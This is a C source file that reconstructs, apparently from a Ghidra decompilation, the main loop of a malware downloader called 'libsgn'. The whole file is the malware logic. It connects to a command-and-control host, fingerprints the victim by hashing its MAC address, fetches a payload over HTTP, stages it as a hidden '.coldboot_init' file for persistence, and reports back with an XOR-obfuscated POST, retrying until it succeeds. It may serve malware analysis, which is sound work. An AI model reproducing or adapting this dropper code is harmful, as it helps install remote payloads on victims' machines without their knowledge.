/*
 * libsgn downloader main loop
 * Ghidra: handle_signals @ 0x00001f10, main @ 0x00001f1c
 *
 * signals → connect → MAC+MD5 → GET /adinfo → receive payload →
 * stage .coldboot_init → POST /adinfo (body XOR 0xad)
 */

#include "fingerprint.h"
#include "fs_stage.h"
#include "http.h"
#include "strings.h"

#include <pthread.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void handle_signals(void)
{
#ifdef SIGPIPE
    signal(SIGPIPE, SIG_IGN);
#endif
}

int main(void)
{
    int sock = 0;
    int retry = LIBSGN_RETRY_SLEEP_SEC;
    char mac[LIBSGN_MAC_BUFLEN];
    char gi[LIBSGN_MD5_HEX_LEN];
    char bf[LIBSGN_MD5_HEX_LEN];

    handle_signals();
    sleep(LIBSGN_BOOT_SLEEP_SEC);
    (void)geteuid();

    for (;;) {
        int staged = 0;
        void *payload = NULL;
        size_t payload_len = 0;

        memset(mac, 0, sizeof(mac));
        memset(gi, 0, sizeof(gi));
        memset(bf, 0, sizeof(bf));

        if (socket_connect(&sock, LIBSGN_C2_HOST, LIBSGN_C2_PORT) == 1) {
            get_random_hexlified_md5(bf);
            get_mac_address(mac);
            get_hexlified_md5(mac, gi, LIBSGN_MAC_BYTES);

            if (http_send_request_with_get(gi, bf, LIBSGN_C2_HOST, sock) == 1 &&
                http_receive_payload(sock, &payload, &payload_len) == 1) {
                socket_disconnect(&sock);
                if (socket_connect(&sock, LIBSGN_C2_HOST, LIBSGN_C2_PORT) == 1 &&
                    (int)payload_len > 0 &&
                    stage_coldboot_payload(payload, payload_len) == 1) {
                    /* POST follow-up — body XOR 0xad */
                    if (http_send_response_with_post(gi, bf, LIBSGN_C2_HOST,
                                                     NULL, 0, sock) == 1)
                        staged = 1;
                }
            }
        }

        if (payload)
            free(payload);
        socket_disconnect(&sock);
        if (staged)
            pthread_exit(NULL);
        sleep((unsigned)retry);
    }
}
